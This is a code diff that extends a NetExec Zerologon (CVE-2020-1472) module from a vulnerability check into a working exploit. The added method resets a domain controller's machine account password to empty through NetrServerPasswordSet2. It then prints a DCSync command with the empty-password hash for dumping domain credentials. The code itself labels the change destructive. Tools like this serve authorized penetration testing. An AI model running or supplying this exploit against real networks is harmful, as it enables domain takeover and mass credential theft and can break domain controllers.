@@ -14,7 +14,7 @@ MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
 
 class NXCModule:
     name = "zerologon"
-    description = "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
+    description = "Check if the DC is vulnerable to Zerologon (CVE-2020-1472); optionally exploit it (EXPLOIT=True, DESTRUCTIVE)"
     supported_protocols = ["smb", "wmi"]
     category = CATEGORY.ENUMERATION
 
@@ -23,7 +23,8 @@ class NXCModule:
         self.module_options = module_options
 
     def options(self, context, module_options):
-        """"""
+        """EXPLOIT   Reset the DC machine account password to an empty string when vulnerable (DESTRUCTIVE, breaks the DC until restored). Default: False"""
+        self.exploit = module_options.get("EXPLOIT", "").lower() in ("true", "1", "yes")
 
     def on_login(self, context, connection):
         self.context = context
@@ -61,11 +62,37 @@ class NXCModule:
             for _attempt in range(MAX_ATTEMPTS):
                 result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                 if result:
+                    if self.exploit:
+                        self.reset_machine_password(rpc_con, dc_handle, target_computer)
                     return True
             else:
                 self.context.log.highlight("Attack failed. Target is probably patched.")
         except DCERPCException:
             self.context.log.fail("Error while connecting to host: DCERPCException, which means this is probably not a DC!")
+
+    def reset_machine_password(self, rpc_con, dc_handle, target_computer):
+        self.context.log.highlight("EXPLOIT: resetting the DC machine account password to an empty string (DESTRUCTIVE)")
+        request = nrpc.NetrServerPasswordSet2()
+        request["PrimaryName"] = dc_handle + "\x00"
+        request["AccountName"] = target_computer + "$\x00"
+        request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+        authenticator["Credential"] = b"\x00" * 8
+        authenticator["Timestamp"] = 0
+        request["Authenticator"] = authenticator
+        request["ComputerName"] = target_computer + "\x00"
+        request["ClearNewPassword"] = b"\x00" * 516
+        try:
+            result = rpc_con.request(request)
+        except nrpc.DCERPCSessionError as e:
+            self.context.log.fail(f"Exploit failed: {e}")
+            return
+        if result["ErrorCode"] != 0:
+            self.context.log.fail(f"Exploit returned non-zero code: {result['ErrorCode']}")
+            return
+        self.context.log.success(f"Exploit successful: {target_computer}$ password is now empty")
+        self.context.log.highlight(f"DCSync: netexec smb {dc_handle.lstrip(chr(92))} -u '{target_computer}$' -H 31d6cfe0d16ae931b73c59d7e0c089c0 --ntds")
+        self.context.log.highlight("RESTORE the machine password afterwards, otherwise the DC stays broken: https://github.com/dirkjanm/CVE-2020-1472 (restorepassword.py)")
 
 
 def fail(msg):
